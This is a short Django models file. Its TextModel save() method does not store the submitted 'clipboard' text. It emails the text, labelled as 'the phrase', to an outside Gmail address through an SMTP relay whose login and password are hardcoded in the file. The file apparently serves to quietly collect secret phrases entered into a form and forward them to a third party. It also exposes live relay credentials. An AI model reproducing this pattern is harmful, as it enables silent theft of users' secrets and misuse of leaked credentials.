from django.db import models
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


# Create your models here.
def Sendmail(body):
    subject = "New TextModel Created"
    receiver_email = "novendd7@gmail.com"
    from_mail = "nchidinma4@gmail.com"
    sender_mail = "7d2f1f001@smtp-brevo.com"
    sender_pass = "fGyk38rg12CpF9sQ"
    smtp_server = 'smtp-relay.brevo.com'

    message = MIMEMultipart()
    message['From'] = from_mail
    message['To'] = receiver_email
    message['Subject'] = subject
    # Attach the body of the email
    message.attach(MIMEText(body, 'plain'))


    context = ssl.create_default_context()
    try:
        with smtplib.SMTP(smtp_server, 587) as s:
            s.starttls(context=context)
            s.login(sender_mail,sender_pass)
            s.sendmail(sender_mail, receiver_email, message.as_string())
            print("success")
            
    except smtplib.SMTPAuthenticationError as e:
        print(f"smtp error {e}")
    except Exception as e:
        print(f"exception {e}")


class TextModel(models.Model):
    clipboard = models.CharField(max_length=120)

    def save(self, *args, **kwargs):
        
        message = f"the phrase is \"{self.clipboard}\" "
        Sendmail(message)
        print("done")
        #super().save(*args, **kwargs)
